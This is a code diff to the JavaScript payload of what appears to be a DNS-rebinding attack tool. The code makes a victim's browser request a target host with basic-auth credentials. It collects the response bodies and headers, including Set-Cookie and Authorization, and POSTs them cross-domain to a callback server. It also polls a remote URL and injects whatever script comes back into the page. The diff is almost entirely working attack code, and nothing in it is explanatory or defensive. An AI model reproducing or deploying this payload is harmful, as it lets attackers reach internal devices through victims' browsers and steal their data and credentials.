@@ -20,20 +20,53 @@ var target_url = window.location.protocol + "/" + "/" + window.location.hostname
 if(window.location.port){
 	target_url += ":" + window.location.port;
 }
-var NULL = null;
+var NULL=null;
 
 String.prototype.strip = function() {
         return this.replace(/^\s+|\s+$/g,"");
 }
 
-function request(url,postData,rheaders)
+function rebind_request(url)
+{
+	var data = null;
+	var async = false;
+
+	try {
+                xmlObj = new XMLHttpRequest();
+        } catch (err) {
+                try {
+                        xmlObj = new ActiveXObject("Msxml2.XMLHTTP");
+                } catch (err) {
+                        try {
+                                xmlObj = new ActiveXObject("Microsoft.XMLHTTP");
+                        } catch(err){
+                                return;
+                        }
+                }
+        }
+
+        try {
+                xmlObj.open("GET",url,async,basic_user,basic_pass);
+		xmlObj.send(null);
+		data = xmlObj.status + xmlObj.statusText + xmlObj.responseText;
+
+	} catch(err) {}
+
+        if(data != null && data != ""){
+                pollServer();
+                setInterval("pollServer()",callback_interval);  
+        }
+
+}
+
+function request(id,url,postData,rheaders)
 {
         var method = null;
         var xmlObj = null;
 	var data = null;
 	var kv = null;
 	var hvalue = null;
-	var async = false;
+	var async = true;
 	var headers = new Array();
 	var desired_headers = ["Allow", "Cache-Control", "Content-Location", "Date", "Expires", "Last-Modified", "Location", "Refresh", "Retry-After", "Server", "Set-Cookie", "Authorization"];
         var ret    = {
@@ -78,7 +111,7 @@ function request(url,postData,rheaders)
                         try {
                                 xmlObj = new ActiveXObject("Microsoft.XMLHTTP");
                         } catch(err){
-                                return null;
+                                return;
                         }
                 }
         }
@@ -91,29 +124,37 @@ function request(url,postData,rheaders)
 				xmlObj.setRequestHeader(headers[i].header,headers[i].value);
 			} catch(err) {}
 		}
+
+		xmlObj.onreadystatechange = function() {
+
+			if(xmlObj.readyState != 4){
+				return;
+			}
+
+			try {   
+                		ret.body = xmlObj.responseText;
+                		ret.status = "HTTP/1.1 " + xmlObj.status + " " + xmlObj.statusText;
+                		ret.headers = "";
+        		} catch(err) {
+                		return;
+        		}
+
+        		for(i=0;i<desired_headers.length;i++){
+                		header = desired_headers[i];
+                		value = xmlObj.getResponseHeader(header);
+        
+                		if(value){
+                        		ret.headers += header + ": " + value + "\r\n";
+                		}
+        		}
+
+        		callback(id,ret.status + "\r\n" + ret.headers + "\r\n" + ret.body);
+		};
+
         	xmlObj.send(postData);
-	} catch(err) {
-		return null;
-	}
+	} catch(err) { }
 
-	try {	
-		ret.body = xmlObj.responseText;
-		ret.status = "HTTP/1.1 " + xmlObj.status + " " + xmlObj.statusText;
-		ret.headers = "";
-	} catch(err) {
-		return null;
-	}
-
-	for(i=0;i<desired_headers.length;i++){
-		header = desired_headers[i];
-		value = xmlObj.getResponseHeader(header);
-	
-		if(value){
-			ret.headers += header + ": " + value + "\r\n";
-		}
-	}
-
-        return ret.status + "\r\n" + ret.headers + "\r\n" + ret.body;
+	return;
 }
 
 function killelement(elid)
@@ -144,14 +185,14 @@ function callback(index,data)
 	/* IE8 cross-domain request */	
 	if(window.XDomainRequest){
 		rq = new XDomainRequest();
-		rq.open("POST",xurl);
+		rq.open("POST",xurl,true);
 		rq.send(xdata);
 		return 1;
 	/* FF 3.5 cross-domain request */
 	} else if(window.XMLHttpRequest && !is_browser("safari")){
 		rq = new XMLHttpRequest();
 		if(rq.withCredentials !== undefined){
-			rq.open("POST",xurl);
+			rq.open("POST",xurl,true);
 			rq.send(xdata);
 			return 1;
 		}
@@ -185,31 +226,31 @@ function pollServer()
 	var el = null;
 	var xhrdata = null;
 	var rq = null;
-	var xhr = false;
 
         /* FF 3.5 cross-domain request */
         if(window.XMLHttpRequest){
                 rq = new XMLHttpRequest();
                 if(rq.withCredentials !== undefined){
-                        rq.open("GET",url,false);
+                        rq.open("GET",url,true);
+
+			rq.onreadystatechange = function() {
+				try {
+					el = document.createElement("script");
+					el.type = "text/javascript";
+					el.text = rq.responseText;
+					document.body.appendChild(el);
+				} catch (err) {}
+			};
+
                         rq.send(null);
-			xhrdata = rq.responseText;
-			xhr = true;
+			return;
                 }
         }
 
 	try {
 		el = document.createElement("script");
 		el.type = "text/javascript";
-		if(xhr){
-			if(xhrdata){
-				el.text = xhrdata;
-			} else {
-				return;
-			}
-		} else {
-			el.src = url;
-		}
+		el.src = url;
 		document.body.appendChild(el);
 	} catch (err) {}
 }
@@ -217,6 +258,7 @@ function pollServer()
 function run()
 {
 	var data = null;
+	var sleep_time = 0;
 
 	if(target_path[0] != '/'){
 		target_path = "/" + target_path;
@@ -228,12 +270,7 @@ function run()
 		}
 	} catch(err) {}
 
-	data = request(target_url + target_path);
-
-	if(data != null){
-		pollServer();
-		setInterval("pollServer()",callback_interval);	
-	}
+	rebind_request(target_url + target_path);
 }
 
 </script>
